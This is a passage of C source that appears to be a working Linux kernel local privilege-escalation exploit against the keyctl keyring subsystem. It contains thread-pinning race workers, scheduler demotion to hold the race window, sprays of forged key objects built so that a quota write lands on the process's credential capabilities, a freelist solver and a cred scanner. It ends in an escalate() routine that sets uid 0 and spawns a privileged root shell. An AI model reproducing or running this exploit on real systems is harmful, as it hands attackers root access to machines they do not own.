        if (fd < 0)
            continue;
        n = read(fd, buffer, sizeof(buffer) - 1);
        close(fd);
        if (n < 0)
            continue;
        buffer[n] = 0;
        printf("[+] PROOF_READ path=%s bytes=%zd\n%s\n", paths[i], n, buffer);
        return 0;
    }
    return -EACCES;
}

/* Capability write observed: become root for real if the box is still alive. */
static int escalate(void)
{
    unsigned long long cap = read_cap_eff();

    if ((cap & UINT64_C(0xffffffff)) != UINT64_C(0xffffffff))
        return -EACCES;
    if (setresuid(0, 0, 0) < 0 || getuid() != 0) {
        printf("GADGET_UID_FAIL uid=%ld errno=%d\n", (long)getuid(), errno);
        return -EACCES;
    }
    printf("[+] GADGET_ROOT uid=0 euid=0 CapEff=%016llx panic_on_oops=%d\n",
           cap, !panic_on_oops_disabled());
    fflush(stdout);
    if (panic_on_oops_disabled()) {
        execl("/bin/sh", "sh", "-p", (char *)NULL);
        execl("/bin/bash", "bash", "-p", (char *)NULL);
        execl("/bin/dash", "dash", (char *)NULL);
    }
    return 0;
}

static void *search_worker(void *argp)
{
    struct race_ctx *ctx = argp;

    ctx->search_tid = (pid_t)syscall(SYS_gettid);
    ctx->sched_rc = pin_current_thread(ctx->cpu);
    atomic_store_explicit(&ctx->search_started, 1, memory_order_release);
    do {
        errno = 0;
        ctx->search_result = keyctl_raw(KEYCTL_SEARCH,
                                        (unsigned long)ctx->source_ring,
                                        (unsigned long)ctx->search_type,
                                        (unsigned long)ctx->search_description,
                                        (unsigned long)ctx->destination_ring);
        ctx->search_errno = ctx->search_result < 0 ? errno : 0;
        atomic_fetch_add_explicit(&ctx->search_attempts, 1,
                                  memory_order_release);
        if (ctx->prep_gate &&
            atomic_load_explicit(&ctx->prep_target_ready,
                                 memory_order_acquire) &&
            atomic_exchange_explicit(&ctx->prep_primary_logged, 1,
                                     memory_order_acq_rel) == 0) {
            unsigned char payload[H_DIRECT_FAKE_BYTES] = {0};
            unsigned long long cap = read_cap_eff();
            int proof_rc = try_proof_file();
            int read_rc = read_carrier(ctx->prep_gate->carriers[0], payload);
            uint32_t usage = read_rc ? UINT32_MAX :
                             get_u32(payload + H_KEY_USAGE);
            uint64_t user = read_rc ? 0 : get_u64(payload + H_KEY_USER);
            uint64_t flags = read_rc ? 0 : get_u64(payload + H_KEY_FLAGS);
            uint16_t quotalen = read_rc ? 0 :
                                get_u16(payload + H_KEY_QUOTALEN);

            atomic_store_explicit(&ctx->search_stop, 1,
                                  memory_order_release);
            if (panic_on_oops_disabled())
                usleep(20000);
            printf("PREP_PRIMARY_RETURN search=%ld errno=%d usage=%#x "
                   "user=%#" PRIx64 " flags=%#" PRIx64 " quotalen=%u "
                   "read_rc=%d CapEff=%016llx proof_rc=%d\n",
                   ctx->search_result, ctx->search_errno, usage, user, flags,
                   quotalen, read_rc, cap, proof_rc);
            fflush(stdout);
        }
        if (!ctx->repeat_search || ctx->search_result >= 0 ||
            (ctx->search_errno != ENOKEY && ctx->search_errno != EPERM))
            break;
        if (ctx->search_errno == EPERM) {
            unsigned long long cap = read_cap_eff();

            if ((cap & UINT64_C(0xffffffff)) == UINT64_C(0xffffffff)) {
                int proof_rc = try_proof_file();

                printf("SEARCH_EFFECT_IN_LOOP CapEff=%016llx proof_rc=%d\n",
                       cap, proof_rc);
                fflush(stdout);
                if (proof_rc == 0)
                    break;
            }
        }
    } while (!atomic_load_explicit(&ctx->search_stop, memory_order_acquire));
    /* The fatal K2 writer runs on the other CPU and never returns to the
     * coordinating thread, so any protected effect must be consumed here,
     * immediately after keyctl cleanup performed the final fake put. */
    ctx->search_cap_after = read_cap_eff();
    ctx->search_flag_rc = try_proof_file();
    printf("SEARCH_POST_EFFECT search=%ld errno=%d CapEff=%016llx proof_rc=%d\n",
           ctx->search_result, ctx->search_errno, ctx->search_cap_after,
           ctx->search_flag_rc);
    if ((ctx->search_cap_after & UINT64_C(0xffffffff)) ==
            UINT64_C(0xffffffff) &&
        ctx->search_cap_after != 0)
        puts("[+] GADGET_CAP_WRITE_OBSERVED search_thread=1");
    fflush(stdout);
    (void)escalate();
    atomic_store_explicit(&ctx->search_done, 1, memory_order_release);
    return NULL;
}

static void *destination_blocker_worker(void *argp)
{
    struct race_ctx *ctx = argp;
    key_serial_t serials[1024];
    int rc = pin_current_thread(ctx->cpu);
    unsigned int index = atomic_fetch_add_explicit(&ctx->blocker_tid_count, 1,
                                                   memory_order_acq_rel);

    ctx->blocker_tid = (pid_t)syscall(SYS_gettid);
    if (index >= K2_BLOCKER_THREADS)
        rc = -E2BIG;
    else
        ctx->blocker_tids[index] = ctx->blocker_tid;
    if (!rc && setpriority(PRIO_PROCESS, 0, 19) < 0)
        rc = -errno;
    ctx->blocker_sched_rc = rc;
    atomic_fetch_add_explicit(&ctx->blocker_started, 1, memory_order_release);
    if (rc) {
        atomic_fetch_add_explicit(&ctx->blocker_done, 1,
                                  memory_order_release);
        return NULL;
    }
    while (atomic_load_explicit(&ctx->blocker_run, memory_order_acquire)) {
        atomic_fetch_add_explicit(&ctx->blocker_inflight, 1,
                                  memory_order_acq_rel);
        errno = 0;
        ctx->blocker_result = keyctl_raw(KEYCTL_READ,
                                         (unsigned long)ctx->destination_ring,
                                         (unsigned long)serials,
                                         sizeof(serials), 0);
        ctx->blocker_errno = ctx->blocker_result < 0 ? errno : 0;
        atomic_fetch_sub_explicit(&ctx->blocker_inflight, 1,
                                  memory_order_acq_rel);
        if (ctx->blocker_result < 0)
            break;
        if (ctx->blocker_result !=
            (long)(ctx->destination_entries * sizeof(key_serial_t))) {
            ctx->blocker_errno = EMSGSIZE;
            break;
        }
        atomic_fetch_add_explicit(&ctx->blocker_reads, 1,
                                  memory_order_release);
    }
    atomic_fetch_add_explicit(&ctx->blocker_done, 1, memory_order_release);
    return NULL;
}

static void *normal_spinner_worker(void *argp)
{
    struct race_ctx *ctx = argp;

    ctx->spinner_sched_rc = pin_current_thread(ctx->cpu);
    if (!ctx->spinner_sched_rc && setpriority(PRIO_PROCESS, 0, 19) < 0)
        ctx->spinner_sched_rc = -errno;
    atomic_store_explicit(&ctx->spinner_ready, 1, memory_order_release);
    for (;;) {
        int state = atomic_load_explicit(&ctx->spinner_run,
                                         memory_order_acquire);

        if (state < 0)
            break;
        if (state == 0) {
            (void)futex_wait_atomic(&ctx->spinner_run, 0);
            continue;
        }
        __asm__ __volatile__("pause" ::: "memory");
    }
    return NULL;
}

static void *updater_worker(void *argp)
{
    struct race_ctx *ctx = argp;
    uint64_t deadline;
    unsigned char payload[H_DIRECT_FAKE_BYTES];
    pthread_t spinner;
    int prc;
    size_t i;

    ctx->owner_index = -1;
    ctx->update_rc = pin_current_thread(ctx->cpu);
    if (ctx->update_rc)
        return NULL;
    if (ctx->prep_gate) {
        struct k2_prep_gate *gate = ctx->prep_gate;
        bool parked = false;

        while (!atomic_load_explicit(&ctx->search_started,
                                     memory_order_acquire))
            sched_yield();
        atomic_store_explicit(&ctx->prep_runtime_ready, 1,
                              memory_order_release);
        deadline = monotonic_msec() + ctx->timeout_ms;
        while (monotonic_msec() < deadline) {
            char wchan[128] = {0};

            if (ctx->search_tid > 0 &&
                read_task_wchan(ctx->search_tid, wchan, sizeof(wchan)) == 0 &&
                wchan_is_key_blocked(wchan)) {
                parked = true;
                break;
            }
            if (atomic_load_explicit(&ctx->search_done,
                                     memory_order_acquire))
                break;
            usleep(20);
        }
        if (!parked) {
            char wchan[128] = {0};

            ctx->update_rc = -ETIMEDOUT;
            (void)read_task_wchan(ctx->search_tid, wchan, sizeof(wchan));
            printf("PREP_SEARCH_BLOCK_FAIL tid=%ld wchan=%s attempts=%u\n",
                   (long)ctx->search_tid, wchan[0] ? wchan : "unreadable",
                   atomic_load_explicit(&ctx->search_attempts,
                                        memory_order_acquire));
            fflush(stdout);
            return NULL;
        }
        printf("PREP_SEARCH_REF_HELD search_tid=%ld attempts=%u\n",
               (long)ctx->search_tid,
               atomic_load_explicit(&ctx->search_attempts,
                                    memory_order_acquire));
        fflush(stdout);
        {
            struct sched_param idle = {0};
            unsigned int count = atomic_load_explicit(
                &ctx->blocker_tid_count, memory_order_acquire);

            if (count > K2_BLOCKER_THREADS)
                count = K2_BLOCKER_THREADS;
            for (unsigned int b = 0; b < count; b++) {
                if (sched_setscheduler(ctx->blocker_tids[b], SCHED_IDLE,
                                       &idle) < 0) {
                    ctx->update_rc = -errno;
                    k2_prep_gate_stop_spinners(ctx->prep_gate);
                    atomic_store_explicit(&ctx->blocker_run, 0,
                                          memory_order_release);
                    return NULL;
                }
            }
        }
        {
            long owner = keyctl_raw(KEYCTL_SEARCH,
                                    (unsigned long)ctx->source_ring,
                                    (unsigned long)ctx->search_type,
                                    (unsigned long)ctx->search_description,
                                    0);
            uint32_t serial = (uint32_t)owner;
            unsigned int rank, mapped;
            int target;

            if (owner < 0 ||
                (serial & UINT32_C(0xffff0000)) != K2_PREP_SERIAL_BASE ||
                (serial & UINT32_C(0xffff)) == 0 ||
                (serial & UINT32_C(0xffff)) > k2_prep_workers) {
                ctx->update_rc = owner < 0 ? -errno : -EUCLEAN;
                printf("PREP_TARGET_OWNER_FAIL search=%ld rc=%d\n", owner,
                       ctx->update_rc);
                fflush(stdout);
                return NULL;
            }
            rank = (serial & UINT32_C(0xffff)) - 1U;
            if (rank < k2_prep_prefix) {
                ctx->update_rc = -ERANGE;
                printf("PREP_TARGET_OUTSIDE_CRITICAL allocation_rank=%u "
                       "critical_first=%u critical_last=%u\n", rank,
                       k2_prep_prefix, k2_prep_workers - 1U);
                fflush(stdout);
                return NULL;
            }
            mapped = atomic_load_explicit(&gate->seq_to_worker[rank],
                                          memory_order_acquire);
            if (mapped >= k2_prep_workers ||
                k2_prep_group_for_worker(mapped) !=
                    k2_prep_group_for_worker(rank)) {
                ctx->update_rc = -EUCLEAN;
                printf("PREP_TARGET_MAP_FAIL allocation_rank=%u id=%u\n", rank,
                       mapped);
                fflush(stdout);
                return NULL;
            }
            target = (int)mapped;
            atomic_store_explicit(&gate->target_id, target,
                                  memory_order_release);
            printf("PREP_TARGET_OWNER id=%d allocation_rank=%u gate=%u "
                   "serial=%#x\n", target, rank,
                   k2_prep_group_for_worker(rank), serial);
            fflush(stdout);
        }
        ctx->owner_index = 0;
        ctx->update_rc = k2_prep_gate_release_and_wait(ctx->prep_gate);
        if (ctx->update_rc) {
            printf("PREP_TARGET_VERIFY_FAIL rc=%d\n", ctx->update_rc);
            fflush(stdout);
        } else {
            atomic_store_explicit(&ctx->prep_target_ready, 1,
                                  memory_order_release);
        }
        atomic_store_explicit(&ctx->blocker_run, 0, memory_order_release);
        ctx->spray_rc = ctx->update_rc;
        return NULL;
    }

    prc = pthread_create(&spinner, NULL, normal_spinner_worker, ctx);
    if (prc) {
        ctx->update_rc = -prc;
        return NULL;
    }
    while (!atomic_load_explicit(&ctx->spinner_ready, memory_order_acquire))
        sched_yield();
    while (!atomic_load_explicit(&ctx->search_started, memory_order_acquire))
        sched_yield();
    deadline = monotonic_msec() + ctx->timeout_ms;
    while (monotonic_msec() < deadline) {
        for (i = 0; i < ctx->initial_count; i++) {
            if (read_carrier(ctx->initial_serials[i], payload) == 0 &&
                get_u64(payload + H_KEY_LAST_USED) !=
                    ctx->baseline_markers[i]) {
                ctx->owner_index = (int)i;
                goto marker;
            }
        }
        if (atomic_load_explicit(&ctx->search_done, memory_order_acquire))
            break;
        usleep(50);
    }
    ctx->update_rc = -ETIMEDOUT;
    atomic_store_explicit(&ctx->spinner_run, -1, memory_order_release);
    futex_wake_atomic(&ctx->spinner_run, 1);
    pthread_join(spinner, NULL);
    return NULL;

marker:
    if (ctx->blocker_prearmed)
        goto blocker_confirmed;
    deadline = monotonic_msec() + ctx->timeout_ms;
    for (;;) {
        if (atomic_load_explicit(&ctx->blocker_inflight,
                                 memory_order_acquire)) {
            unsigned int attempts = atomic_load_explicit(
                &ctx->search_attempts, memory_order_acquire);

            usleep(50);
            if (atomic_load_explicit(&ctx->blocker_inflight,
                                     memory_order_acquire) &&
                atomic_load_explicit(&ctx->search_attempts,
                                     memory_order_acquire) == attempts)
                break;
        } else {
            usleep(20);
        }
        if (monotonic_msec() >= deadline) {
            ctx->update_rc = -ETIMEDOUT;
            goto stop_spinner;
        }
    }
    {
        struct sched_param idle = {0};
        unsigned int count = atomic_load_explicit(&ctx->blocker_tid_count,
                                                  memory_order_acquire);

        ctx->blocker_demote_rc = 0;
        if (count > K2_BLOCKER_THREADS)
            count = K2_BLOCKER_THREADS;
        for (unsigned int b = 0; b < count; b++) {
            if (sched_setscheduler(ctx->blocker_tids[b], SCHED_IDLE,
                                   &idle) < 0 && !ctx->blocker_demote_rc)
                ctx->blocker_demote_rc = -errno;
        }
    }
    if (ctx->blocker_demote_rc) {
        ctx->update_rc = ctx->blocker_demote_rc;
        goto stop_spinner;
    }
blocker_confirmed:
    sched_yield();
    atomic_store_explicit(&ctx->spinner_run, 1, memory_order_release);
    futex_wake_atomic(&ctx->spinner_run, 1);
    if (ctx->spinner_sched_rc) {
        ctx->update_rc = ctx->spinner_sched_rc;
        goto stop_spinner;
    }
    ctx->update_rc = update_carrier(ctx->initial_serials[ctx->owner_index],
                                    ctx->fake);
    if (ctx->update_rc)
        goto stop_spinner;
    ctx->gp_rc = global_rcu_gp();
    if (ctx->gp_rc)
        goto stop_spinner;
    for (i = 0; i < ctx->spray_count; i++) {
        ctx->spray_rc = update_carrier(ctx->spray_serials[i], ctx->fake);
        if (ctx->spray_rc)
            break;
    }
    if (!ctx->spray_rc) {
        atomic_store_explicit(&ctx->blocker_run, 0, memory_order_release);
        atomic_store_explicit(&ctx->spinner_run, -1, memory_order_release);
        futex_wake_atomic(&ctx->spinner_run, 1);
        pthread_detach(spinner);
        return NULL;
    }
stop_spinner:
    atomic_store_explicit(&ctx->spinner_run, -1, memory_order_release);
    futex_wake_atomic(&ctx->spinner_run, 1);
    pthread_join(spinner, NULL);
    atomic_store_explicit(&ctx->blocker_run, 0, memory_order_release);
    return NULL;
}

static int validate_gadget_fake(const unsigned char fake[H_DIRECT_FAKE_BYTES])
{
    uint64_t flags = get_u64(fake + H_KEY_FLAGS);

    if (get_u32(fake + H_KEY_USAGE) != 1 ||
        !k2_is_slab_pointer(get_u64(fake + H_KEY_USER)) ||
        !(flags & (UINT64_C(1) << H_KEY_FLAG_IN_QUOTA)))
        return -EINVAL;
    if (get_u16(fake + H_KEY_QUOTALEN) != 1)
        return -EINVAL;
    return 0;
}

typedef int (*race_trigger_fn)(void *context);

static int run_race_once(key_serial_t source_ring, const char *type,
                         const char *description, int cpu,
                         unsigned int timeout_ms, const char *fake_path,
                         const char *serial_path, size_t spray_count,
                         bool repeat_search, race_trigger_fn trigger,
                         void *trigger_context,
                         struct k2_prep_gate *prep_gate)
{
    struct race_ctx ctx = {0};
    unsigned char fake[H_DIRECT_FAKE_BYTES];
    pthread_t blocker_threads[K2_BLOCKER_THREADS], search_thread,
              updater_thread;
    unsigned long long before, after;
    unsigned int blocker_created = 0;
    bool updater_created = false, search_created = false;
    int rc, prc;

    rc = read_exact_file(fake_path, fake, sizeof(fake));
    if (rc)
        return rc;
    rc = validate_gadget_fake(fake);
    if (rc)
        return rc;
    {
        struct stat st;
        size_t bytes;

        if (stat(serial_path, &st) < 0)
            return -errno;
        bytes = (size_t)st.st_size;
        ctx.initial_count = bytes / sizeof(key_serial_t);
        ctx.initial_serials = calloc(ctx.initial_count + 1,
                                     sizeof(key_serial_t));
        if (!ctx.initial_serials)
            return -ENOMEM;
        rc = read_exact_file(serial_path, ctx.initial_serials, bytes);
        if (rc)
            goto out;
    }
    if (spray_count > ctx.initial_count) {
        rc = -EINVAL;
        goto out;
    }
    ctx.baseline_markers = calloc(ctx.initial_count,
                                  sizeof(*ctx.baseline_markers));
    ctx.spray_serials = calloc(spray_count ? spray_count : 1,
                               sizeof(*ctx.spray_serials));
    if (!ctx.baseline_markers || !ctx.spray_serials) {
        rc = -ENOMEM;
        goto out;
    }
    for (size_t i = 0; i < ctx.initial_count; i++)
        ctx.baseline_markers[i] = get_u64(fake + H_KEY_LAST_USED);
    if (spray_count)
        memcpy(ctx.spray_serials, ctx.initial_serials,
               spray_count * sizeof(*ctx.spray_serials));
    ctx.prep_gate = prep_gate;
    ctx.destination_ring = create_keyring("destination",
                                          KEY_SPEC_PROCESS_KEYRING);
    ctx.holding_ring = create_keyring("holding", KEY_SPEC_PROCESS_KEYRING);
    ctx.quota_ring = create_keyring("quota", KEY_SPEC_PROCESS_KEYRING);
    if (ctx.destination_ring < 0 || ctx.holding_ring < 0 ||
        ctx.quota_ring < 0) {
        rc = ctx.destination_ring < 0 ? ctx.destination_ring :
             ctx.holding_ring < 0 ? ctx.holding_ring : ctx.quota_ring;
        goto out;
    }
    rc = prepare_destination_and_quota(ctx.destination_ring, ctx.holding_ring,
                                       ctx.quota_ring, description, 64,
                                       &ctx.destination_entries,
                                       &ctx.quota_links);
    if (rc)
        goto out;
    for (size_t i = 0; i < ctx.initial_count; i++) {
        if (keyctl_raw(KEYCTL_LINK, (unsigned long)ctx.initial_serials[i],
                       (unsigned long)ctx.destination_ring, 0, 0) < 0) {
            rc = -errno;
            goto out;
        }
        ctx.destination_entries++;
    }
    if (keyctl_raw(KEYCTL_RESTRICT_KEYRING,
                   (unsigned long)ctx.destination_ring, 0, 0, 0) < 0) {
        rc = -errno;
        goto out;
    }
    ctx.source_ring = source_ring;
    ctx.search_type = type;
    ctx.search_description = description;
    ctx.fake = fake;
    ctx.cpu = cpu;
    ctx.timeout_ms = timeout_ms;
    ctx.spray_count = spray_count;
    ctx.repeat_search = repeat_search;
    ctx.trace_critical = panic_on_oops_disabled();
    before = read_cap_eff();
    atomic_store(&ctx.blocker_run, 1);
    for (unsigned int i = 0; i < K2_BLOCKER_THREADS; i++) {
        prc = pthread_create(&blocker_threads[i], NULL,
                             destination_blocker_worker, &ctx);
        if (prc) {
            rc = -prc;
            goto stop_threads;
        }
        blocker_created++;
    }
    while (atomic_load_explicit(&ctx.blocker_started, memory_order_acquire) <
           (int)blocker_created)
        sched_yield();
    {
        uint64_t deadline = monotonic_msec() + 1000;

        while (atomic_load_explicit(&ctx.blocker_reads, memory_order_acquire) <
                   8 &&
               atomic_load_explicit(&ctx.blocker_done, memory_order_acquire) <
                   (int)blocker_created &&
               monotonic_msec() < deadline)
            sched_yield();
        if (atomic_load_explicit(&ctx.blocker_reads, memory_order_acquire) < 8) {
            rc = -EAGAIN;
            goto stop_threads;
        }
    }
    prc = pthread_create(&updater_thread, NULL, updater_worker, &ctx);
    if (prc) {
        rc = -prc;
        goto stop_threads;
    }
    updater_created = true;
    prc = pthread_create(&search_thread, NULL, search_worker, &ctx);
    if (prc) {
        atomic_store(&ctx.search_started, 1);
        atomic_store(&ctx.search_done, 1);
        pthread_join(updater_thread, NULL);
        updater_created = false;
        rc = -prc;
        goto stop_threads;
    }
    search_created = true;
    if (trigger) {
        uint64_t deadline = monotonic_msec() + 1000;

        while (!atomic_load_explicit(&ctx.search_attempts,
                                     memory_order_acquire) &&
               !atomic_load_explicit(&ctx.search_done, memory_order_acquire) &&
               monotonic_msec() < deadline)
            sched_yield();
        if (!atomic_load_explicit(&ctx.search_attempts,
                                  memory_order_acquire)) {
            rc = -EAGAIN;
            goto stop_threads;
        }
        if (ctx.prep_gate) {
            deadline = monotonic_msec() + 5000;
            while (!atomic_load_explicit(&ctx.prep_runtime_ready,
                                         memory_order_acquire) &&
                   monotonic_msec() < deadline)
                sched_yield();
            if (!atomic_load(&ctx.prep_runtime_ready) || ctx.update_rc) {
                rc = ctx.update_rc ? ctx.update_rc : -ETIMEDOUT;
                goto stop_threads;
            }
        }
        rc = trigger(trigger_context);
        if (rc)
            goto stop_threads;
    }
    pthread_join(updater_thread, NULL);
    updater_created = false;
    atomic_store_explicit(&ctx.search_stop, 1, memory_order_release);
    atomic_store_explicit(&ctx.blocker_run, 0, memory_order_release);
    for (unsigned int i = 0; i < blocker_created; i++)
        pthread_join(blocker_threads[i], NULL);
    blocker_created = 0;
    pthread_join(search_thread, NULL);
    search_created = false;
    after = read_cap_eff();
    printf("RACE_RESULT owner=%d search=%ld search_errno=%d sched_rc=%d "
           "blocker=%ld blocker_errno=%d blocker_sched_rc=%d reads=%u "
           "spinner_sched_rc=%d dest_entries=%u quota_links=%u update_rc=%d "
           "gp_rc=%d spray_rc=%d CapEff_before=%016llx CapEff_after=%016llx\n",
           ctx.owner_index, ctx.search_result, ctx.search_errno, ctx.sched_rc,
           ctx.blocker_result, ctx.blocker_errno, ctx.blocker_sched_rc,
           atomic_load(&ctx.blocker_reads), ctx.spinner_sched_rc,
           ctx.destination_entries, ctx.quota_links, ctx.update_rc,
           ctx.gp_rc, ctx.spray_rc, before, after);
    if ((after & UINT64_C(0xffffffff)) == UINT64_C(0xffffffff) &&
        after != before) {
        int proof_rc = try_proof_file();

        printf("[+] GADGET_CAP_WRITE_OBSERVED proof_rc=%d\n", proof_rc);
        rc = proof_rc;
    } else {
        rc = ctx.owner_index < 0 ? -ETIMEDOUT : -EAGAIN;
    }
    goto out;
stop_threads:
    atomic_store(&ctx.search_started, 1);
    atomic_store(&ctx.search_stop, 1);
    atomic_store(&ctx.blocker_run, 0);
    if (updater_created)
        pthread_join(updater_thread, NULL);
    for (unsigned int i = 0; i < blocker_created; i++)
        pthread_join(blocker_threads[i], NULL);
    if (search_created)
        pthread_join(search_thread, NULL);
out:
    free(ctx.initial_serials);
    free(ctx.baseline_markers);
    free(ctx.spray_serials);
    return rc;
}

static unsigned long long read_cap_eff(void)
{
    unsigned long long cap = 0;

    (void)read_cap_eff_checked(&cap);
    return cap;
}

static int read_cap_eff_checked(unsigned long long *cap)
{
    FILE *file;
    char line[256];

    if (!cap)
        return -EINVAL;
    file = fopen("/proc/self/status", "r");
    if (!file)
        return -errno;
    while (fgets(line, sizeof(line), file)) {
        if (sscanf(line, "CapEff:%llx", cap) == 1) {
            fclose(file);
            return 0;
        }
    }
    fclose(file);
    return -ENODATA;
}

static int selftest(void)
{
#define SELFTEST_CHECK(condition, label) do { \
    if (!(condition)) { \
        fprintf(stderr, "SELFTEST_FAIL %s\n", label); \
        return 1; \
    } \
} while (0)
    const uint64_t base = UINT64_C(0xffff9e8d4011b000);
    const uint64_t random = UINT64_C(0x6d3173f9ac842b10);
    const uint64_t fake_address = base + 0x318;
    uint64_t enc[H_USER_PAYLOAD_OBJECTS_PER_SLAB];
    struct freelist_solution sol;
    struct fake_spec spec;
    unsigned char fake[H_DIRECT_FAKE_BYTES];
    struct gap_plan payload_plan, filp_plan;
    uint64_t cred = UINT64_C(0xffff9e8d40112280), scanned;
    unsigned int hits, i;

    if (k2_layout_probe() != 0)
        return 1;
    if (k2_layout_finish(base) != 0 || k2_layout_selftest() != 0)
        return 1;
    k2l.freeptr = 128;
    make_synthetic_freelist(base, random, enc);
    SELFTEST_CHECK(solve_freelist(enc, &sol) == 0 && sol.base == base &&
                   sol.random == random, "freelist_solver");
    spec = (struct fake_spec){
        .cred = (cred + k2l.cred_cap_effective) - k2l.ku_qnbytes,
        .type = UINT64_C(0xffffffff84ad5ea0),
        .domain_tag = UINT64_C(0xffffffff84ad57b8),
        .description = fake_address + k2l.desc_off,
        .hash = UINT64_C(0x1122334455667789),
        .x = k2_index_x("t0000000000000", K2_TARGET_LEN),
    };
    build_direct_fake(fake, &spec, "t0000000000000", K2_TARGET_LEN,
                      fake_address);
    SELFTEST_CHECK(get_u32(fake + H_KEY_USAGE) == 1, "fake_usage");
    SELFTEST_CHECK(get_u64(fake + H_KEY_USER) + k2l.ku_qnbytes ==
                   cred + k2l.cred_cap_effective, "quota_overlap");
    SELFTEST_CHECK(get_u64(fake + k2l.node_slots + k2l.fake_slot * 8) ==
                   fake_address, "fake_node_leaf");
    SELFTEST_CHECK(!memcmp(fake + k2l.desc_off, "t000", 4), "fake_description");
    SELFTEST_CHECK(get_u16(fake + H_KEY_DESC_LEN) == K2_TARGET_LEN,
                   "fake_desc_len");
    SELFTEST_CHECK(validate_gadget_fake(fake) == 0, "validate_gadget_fake");
    SELFTEST_CHECK(build_payload_freelist_plan(&payload_plan) == 0 &&
                   payload_plan.expected_return == 4096, "payload_gap_plan");
    for (i = 0; i < H_USER_PAYLOAD_OBJECTS_PER_SLAB; i++)
        SELFTEST_CHECK(plan_has_gap(&payload_plan,
                       i * H_USER_PAYLOAD_BUCKET + H_USER_PAYLOAD_FREEPTR),
                       "payload_target_gap");
    SELFTEST_CHECK(build_filp_cred_plan(&filp_plan) == 0 &&
                   filp_plan.expected_return == 4096, "filp_gap_plan");
    for (i = 0; i < k2l.files_per_slab; i++)
        SELFTEST_CHECK(plan_has_gap(&filp_plan,
                                    i * H_FILE_STRIDE + H_FILE_CRED),
                       "filp_target_gap");
    {
        unsigned char page[4096] = {0};

        for (i = 0; i < k2l.files_per_slab; i++)
            put_u64(page + i * H_FILE_STRIDE + H_FILE_CRED, cred);
        SELFTEST_CHECK(scan_filp_cred(page, &scanned, &hits) == 0 &&
                       scanned == cred && hits == k2l.files_per_slab,
                       "filp_cred_scanner");
    }
    printf("SELFTEST_PASS key_user=%#x desc_off=%u fake_slot=%u freeptr=%u "
           "files_per_slab=%u\n", H_KEY_USER, k2l.desc_off, k2l.fake_slot,
           k2l.freeptr, k2l.files_per_slab);
#undef SELFTEST_CHECK
    return 0;
}
